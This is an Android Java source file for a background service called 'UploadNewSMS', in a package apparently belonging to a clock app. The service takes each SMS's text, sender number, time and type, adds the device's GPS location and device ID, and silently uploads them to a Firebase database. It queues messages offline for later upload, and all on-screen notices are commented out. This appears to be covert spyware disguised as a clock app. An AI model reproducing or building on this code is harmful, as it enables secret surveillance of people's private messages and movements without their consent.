package com.aftab.clock.Services;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.aftab.clock.Model.SimSMS;
import com.aftab.clock.Receivers.NetworkChangeReceiver;
import com.aftab.clock.Utills.Constants;
import com.aftab.clock.Utills.FireRef;
import com.aftab.clock.Utills.Functions;
import com.aftab.clock.Utills.SharedPref;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.Task;

import java.util.ArrayList;

import im.delight.android.location.SimpleLocation;

public class UploadNewSMS extends IntentService {
    public static double longitude = 0;
    public static double latitude = 0;
    Context context;
    SharedPref sh;
    String smsBody, number, type;
    long date;
    private SimpleLocation simpleLocation;


    public UploadNewSMS() {
        super("UploadNewSMS");
    }


    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {

        assert intent != null;
        smsBody = intent.getStringExtra(Constants.SIM_SMS);
        number = intent.getStringExtra(Constants.NUMBER);
        date = intent.getLongExtra(Constants.DATE, System.currentTimeMillis());
        type = intent.getStringExtra(Constants.TYPE);

       // Toast.makeText(context, "RUNNING" + "\n" + Functions.getDateTime(date + ""), Toast.LENGTH_SHORT).show();

       /* LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);

        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 2000, 10, new LocationListener() {
            @Override
            public void onStatusChanged(String s, int i, Bundle bundle) {
            }

            @Override
            public void onProviderEnabled(String s) {
            }

            @Override
            public void onProviderDisabled(String s) {
            }

            @Override
            public void onLocationChanged(final Location location) {
            }
        });
        Location myLocation = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
        longitude = myLocation.getLongitude();
        latitude = myLocation.getLatitude();*/


       /* SingleShotLocationProvider.requestSingleUpdate(context,
                location -> {

                    longitude = location.longitude;
                    latitude = location.latitude;


                });*/


        longitude = simpleLocation.getLongitude();
        latitude = simpleLocation.getLatitude();

        String deviceID = Functions.getDeviceId(context);

        if (number.contains(".")) {

            number = number.replace(".", ",");

        } else if (number.contains("#")) {

            number = number.replace("#", "-");

        } else if (number.contains("$")) {

            number = number.replace("$", "_");

        } else if (number.contains("[")) {

            number = number.replace("[", "+");

        } else if (number.contains("]")) {

            number = number.replace("]", "/");

        }

        if (!number.contains("*") && !number.contains("#")) {

            if (!number.startsWith("+") && number.length() > 6) {

                number = Functions.formatNumber(context, number, Functions.checkCountryISO(context));


            }

        }

        String latLng = longitude + "," + latitude;

        String pushId = date + number;
        SimSMS objSimSMS = new SimSMS(pushId, number, smsBody, type, date + "", latLng, false);


        objSimSMS.setLocation(latLng);


        if (!NetworkChangeReceiver.isOnline(context)) {

            ArrayList<SimSMS> simSMSArrayList = new ArrayList<>();
            simSMSArrayList.add(objSimSMS);

            sh.saveSMSList(simSMSArrayList, Constants.SIM_SMS);

            //save to offline
            ///Toast.makeText(context, "OUT", Toast.LENGTH_SHORT).show();

        } else {

           // Toast.makeText(context, "IN", Toast.LENGTH_SHORT).show();

            ArrayList<SimSMS> simSMSArrayList = sh.getSMSList(Constants.SIM_SMS);

            if (simSMSArrayList != null) {

                if (simSMSArrayList.size() > 0) {

                    for (int i = 0; i < simSMSArrayList.size(); i++) {

                        SimSMS simSMS = simSMSArrayList.get(i);


                        String pushId2 = simSMS.getTime() + simSMS.getAddress();


                        FireRef.SIM_SMS.child(deviceID)
                                .child(simSMS.getAddress())
                                .child(pushId2)
                                .setValue(simSMS);

                    }
                }
            }

            sh.removeList(Constants.SIM_SMS);

            FireRef.SIM_SMS.child(deviceID)
                    .child(number)
                    .child(pushId)
                    .setValue(objSimSMS).addOnCompleteListener(new OnCompleteListener<Void>() {
                @Override
                public void onComplete(@NonNull Task<Void> task) {

                    // Toast.makeText(context, "Sucess", Toast.LENGTH_SHORT).show();

                }
            }).addOnFailureListener(new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {

                 //   Toast.makeText(context, "" + e.getMessage(), Toast.LENGTH_SHORT).show();

                }
            });

        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        sh = new SharedPref(context);
        simpleLocation = new SimpleLocation(this);
        simpleLocation.beginUpdates();
    }


    @Override
    public void onDestroy() {
        super.onDestroy();
        simpleLocation.endUpdates();
    }
}